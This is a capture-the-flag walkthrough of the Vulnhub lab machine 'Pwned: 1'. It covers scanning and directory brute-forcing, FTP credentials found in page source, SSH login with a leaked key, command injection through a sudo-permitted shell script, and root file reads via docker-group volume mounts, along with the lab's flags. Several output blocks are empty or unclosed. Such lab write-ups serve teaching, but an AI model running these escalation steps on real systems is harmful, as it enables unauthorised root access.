## Overview
---

Notes for my completion of the Vulnhub machine PWNED: 1 by Ajs Walker.
Description

Below is the description provided by the author of the VM.

- VM name: Pwned
- Difficulty: Easy
- DHCP: Enabled
- Goal: 3 flags

This works better with VirtualBox rather than VMware.

Below is a link to the Vulnhub machine.

# Enumeration
---

Started out with enumerating services on the VM with an Nmap scan. Looks like the server is hosting an FTP and web server. SSH is available on the VM as well. Looks like this is a Debian/Ubuntu box.
```sh
nmap -sS -A -p- -O -sV 192.168.56.101
```

Below is the output from the Nmap command.

```sh

Scanned the VM with Nikto and it found a page named /nothing/ in the robots.txt file on the web server.
```

```sh
nikto -host http://192.168.56.101
```

Below is the output from the Nikto command.

Decided to install Gobuster and brute force any directories that Nikto might be missing. Looks like it also found the /nothing/. But, It also found a page named /server-status and /hidden-text. The hidden-text page more interesting than the others. So, I’m going to focus on that.

```sh

Investigated the hidden-text page a little further by going to it with curl. Looks like there is a dictionary file named secret.dic on the server.

```sh
curl http://192.168.56.101/hidden_text/
```

Below is the output from the curl(1) command.

```html

Downloaded the secret.dic file using wget so I could continue using it for later.

```sh
wget http://192.168.56.101/hidden_text/secret.dic
```

Below is the output from the command.

Ran the dictionary file secret.dic against the web server on the VM and it found a page named pwned.vuln.

Looks like someone named vanakam nanba hacked the login page. Looks like someone named vanakam nanba hacked the login page. on further inspection of the pwned.vuln page looks like there are FTP credentials commented out in the source of the page. Below are the credentials found.

- Username: ftpuser
- Password: B0ss_B!TcH

Now I’m going to start diverting my attention to the FTP server.

```sh
curl http://192.168.56.101/pwned.vuln/
```

```html
<!DOCTYPE html>
<html>
<head> 
	<title>login</title>
</head>
<body>
		<div id="main">
			<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
			<form method="POST">
			Username <input type="text" name="username" class="text" autocomplete="off" required>
			Password <input type="password" name="password" class="text" required>
			<input type="submit" name="submit" id="sub">
			</form>
			</div>
</body>
</html>
```


```php
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

Logged into the FTP server with the credentials found in the source of the pwned.vuln page. This provides two files which are a private key for the SSH server - guessing - and a file named note.txt.

```sh

## Flag 1
---

Decided to open and read the note.txt file and it shows the following information. Looks like there is the name of a user in there. Specifically named ariana. This could be the username for the next account.

```sh
cat note.txt 

Wow you are here 

ariana won't happy about this note 

sorry ariana :( 
```

It’s possible that the SSH key hosted on the FTP server is the private key for Ariana’s account. Used the -i flag ssh to use the private key to ssh into her account and it was successful. Checked the contents of the directory and it looks like there are files named user1.txt and ariana-personal.diary.

```sh
ssh -i id_rsa ariana@192.168.56.101

```

Looked at the file user1.txt and it looks like we found the flag.

```sh
more user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

Below is the first flag:

- Flag 1: fb8d98be1265dd88bac522e1b2182140

## Flag 2
---

Looked at the file named ariana-personal.diary and it looks like Selena fought with Ariana over Ajay. So she opened her hidden_text file on the server. Ariana is claiming that Selena is responsible. Ok.

```sh
more ariana-personal.diary 
Its Ariana personal Diary :::

Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
```

Couldn’t find anything else in the home directory. So I checked a couple of environment variables. Didn’t find much. Listed the commands that were allowed to run using sudo and it looks like Selena can run the /home/messenger.sh file with no password.

```sh
sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

I know that there is a command injection vulnerability in this script somewhere. I’m thinking its in the message portion. The message portion is redirecting STDERR to /dev/null and may prove fruitful.

```sh
more /home/messenger.sh 
#!/bin/bash

clear
echo "Welcome to linux.messenger "
		echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
		echo ""
echo "$users"
		echo ""
read -p "Enter username to send message : " name 
		echo ""
read -p "Enter message for $name :" msg
		echo ""
echo "Sending message to $name "

$msg 2> /dev/null

		echo ""
echo "Message sent to $name :) "
		echo ""
```

Decided to run it without doing anything and it looks like it just notifies me that it’s sending the message to Selina.

```sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :test

Sending message to selena 

Message sent to selena :) 
```

I ran it again with sudo and in the message portion I started a bash shell with /bin/bash. After sending the message it stops and it looks like I might have a shell. So, I decided to spawn a shell using Python’s pty library which spawns a full shell as the user selena.

I enter the id command and it looks like selena is part of the docker group on the machine. Which may come in handy later.

```sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena 
python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Checked the contents of the directory. Looks like there is a file named user2.txt in the directory. Looks like the flag is in the output below.

```sh
elena@pwned:~$ ls
selena-personal.diary  user2.txt
selena@pwned:~$ cat user2.txt 
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

Below is Flag 2.

- Flag 2: 711fdfc6caad532815a440f7f295c176

Looks like we know who exposed Ariana’s private ssh key on the FTP server.

```sh
selena@pwned:~$ cat selena-personal.diary 
Its Selena personal Diary :::

Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
```

## Flag 3
---

While obtaining Flag 2, I could see that Selena was part of the docker group. So, I decided to focus on this specifically. Checked to see which container images are available on the VM. Looks like there is an image named privsec which I found interesting.

Based on my understanding. Docker runs with a SUID bit that gives the user running the docker command as root.

```sh
selena@pwned:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        2 months ago        88.3MB
<none>              <none>              e13ad046d435        2 months ago        88.3MB
alpine              latest              a24bb4013296        3 months ago        5.57MB
debian              wheezy              10fcec6d95c4        18 months ago       88.3MB
```

To test this, I decided to run the docker command with the -v flag that will mount the /mnt directory on the /root directory of the host and ran the container image. This allowed me to list the contents of the /mnt directory. Which is actually running the user as root.

Looks like there is a file named root.txt. Decided to open the file. Looks like the next flag is available and we are able to run commands as root.

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc ls -la /mnt
```

Below is the output for the command above.

```sh
total 28
drwx------ 3 root root 4096 Jul 10 07:32 .
drwxr-xr-x 1 root root 4096 Sep  5 05:44 ..

```

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc ls -la /mnt/root.txt
```

```sh
-rw-r--r-- 1 root root 429 Jul 10 06:41 /mnt/root.txt
```

Opened the /mnt/root.txt file using the following command.

```sh
selena@pwned:~$ docker run -v /root:/mnt -it 09ae39f0f8fc cat /mnt/root.txt
```

Below is the output fro the command above.

```sh

## Conclusion
---

This was a fun challenge. I haven’t done a Vulnhub VM in a while. Took a little while to figure this out and publish. But, here we are. This machine tought me about a couple of really bad security practices. One shown below.

- Don’t add users to the docker group.

Things that I already knew.

- Don’t embed credentials in the comments of your website.
- Don’t host public ssh keys on on a publicly accessible FTP server.
